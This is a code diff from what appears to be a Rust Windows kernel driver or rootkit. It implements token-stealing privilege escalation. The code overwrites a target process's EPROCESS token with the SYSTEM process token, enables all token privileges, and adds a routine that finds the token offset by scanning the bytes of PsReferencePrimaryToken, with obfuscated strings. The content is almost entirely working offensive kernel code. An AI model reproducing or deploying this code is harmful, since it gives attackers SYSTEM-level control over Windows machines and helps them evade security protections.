@@ -1,7 +1,9 @@
 use common::TargetProcess;
 use winapi::{shared::{ntstatus::{STATUS_UNSUCCESSFUL, STATUS_SUCCESS}}};
-use winapi::shared::ntdef::{NTSTATUS};
-use crate::{process::memory::{Process, Token}, includes::ProcessPrivileges};
+use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
+use crate::{process::{memory::{Process, Token}, get_function_base_address}, includes::ProcessPrivileges};
+
+use crate::string::create_unicode_string;
 
 /// Enables all token privileges for the targeted process
 pub fn enable_all_token_privileges(process: *mut TargetProcess) -> NTSTATUS {
@@ -52,7 +54,7 @@ pub fn enable_all_token_privileges(process: *mut TargetProcess) -> NTSTATUS {
     return STATUS_SUCCESS;
 }
 
-
+/// Elevates to NT AUTHORITY\SYSTEM
 fn get_system(process: *mut TargetProcess) -> NTSTATUS {
 
     // Get target process EPROCESS
@@ -67,22 +69,14 @@ fn get_system(process: *mut TargetProcess) -> NTSTATUS {
         None => return STATUS_UNSUCCESSFUL,
     };
 
-    /* 
-    // Get target process EPROCESS.Token
-    let target_token = match Token::by_token(target_process.eprocess) {
-        Some(t) => t,
+    // Dynamically get EPROCESS.TOKEN offset from PsReferencePrimaryToken
+    let eproccess_token_offset = match get_eprocess_token_offset() {
+        Some(e) => e,
         None => return STATUS_UNSUCCESSFUL,
     };
 
-    // Get system process EPROCESS.Token
-    let _system_token = match Token::by_token(system_process.eprocess) {
-        Some(t) => t,
-        None => return STATUS_UNSUCCESSFUL,
-    };*/
-
-    // Hardcoded offset dynamically get later
-    let target_token_address = unsafe { (target_process.eprocess.cast::<u8>().offset(0x4b8)) as *mut u64};
-    let system_token_address = unsafe { (system_process.eprocess.cast::<u8>().offset(0x4b8)) as *mut u64 };
+    let target_token_address = unsafe { (target_process.eprocess.cast::<u8>().offset(eproccess_token_offset as isize)) as *mut u64};
+    let system_token_address = unsafe { (system_process.eprocess.cast::<u8>().offset(eproccess_token_offset as isize)) as *mut u64 };
 
     log::info!("target_token: {:?}, system_token {:?}", unsafe { target_token_address.read() }, unsafe { system_token_address.read() } );
 
@@ -90,7 +84,40 @@ fn get_system(process: *mut TargetProcess) -> NTSTATUS {
     log::info!("W00TW00T NT AUTHORITY\\SYSTEM: {:#x}", unsafe { target_token_address.read() });
 
     return STATUS_SUCCESS;
+
 }
+
+///Gets the EPROCESS.Token offset dynamically
+pub fn get_eprocess_token_offset() -> Option<u16> {
+    
+    let unicode_function_name = &mut create_unicode_string(
+        obfstr::wide!("PsReferencePrimaryToken\0")
+    ) as *mut UNICODE_STRING;
+    
+    let base_address = get_function_base_address(unicode_function_name);
+
+    if base_address.is_null() {
+        log::error!("PsReferencePrimaryToken is null");
+        return None;
+    }
+
+    let func_slice: &[u8] = unsafe { core::slice::from_raw_parts(base_address as *const u8, 0x19) }; //mov     rdi,rcx
+
+    //4883ec
+    let needle = [0x48, 0x83]; //4883ec20  sub rsp,20h
+
+    if let Some(y) = func_slice.windows(needle.len()).position(|x| *x == needle) {
+        let position = y + 7;
+        let offset_slice = &func_slice[position..position + 2]; //u16::from_le_bytes takes 2 slices
+        let offset = u16::from_le_bytes(offset_slice.try_into().unwrap());
+        log::info!("EPROCESS.TOKEN offset: {:#x}", offset);
+        return Some(offset);
+    }
+
+    return None;
+
+}
+
 
 /*
 0: kd> dt nt!_EPROCESS
